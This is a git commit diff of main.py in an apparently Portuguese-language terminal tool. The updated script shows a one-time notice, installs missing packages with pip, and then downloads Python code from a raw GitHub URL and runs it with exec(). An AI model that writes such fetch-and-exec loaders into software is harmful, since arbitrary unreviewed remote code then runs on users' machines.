64b2b7a8857663f5cd69d3c65987c1c521bc7737
Bruno Parziovanni <70079144+Kiny-Kiny@users.noreply.github.com>
2022-04-13 13:14:56 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,17 @@
-#netin baitola
-from os import execl; from sys import executable; from os import system;from sys import argv
-try: from requests import get;from TerminalButtons import *
-except: system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons');execl(executable, executable, *argv)
-try: exec(get('https://raw.githubusercontent.com/Kiny-Kiny/Kiny-Painel/main/source/_init_.py').text)
-except: print('Verifique sua conexão com a internet!')
+from os import execl, path, system; from sys import executable; from os import system;from sys import argv
+if path.exists("aviso_read?") == False:
+    with open('aviso_read?', 'w+') as f:
+        system('cat aviso.txt')
+        input()
+        f.write('true')
+try:
+    from requests import get;from TerminalButtons import *
+except:
+    system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons')
+    execl(executable, executable, *argv)
+try:
+    exec(
+        get('https://raw.githubusercontent.com/Kiny-Kiny/Kiny-Painel/main/source/_init_.py').text
+    )
+except:
+    print('Verifique sua conexão com a internet!')
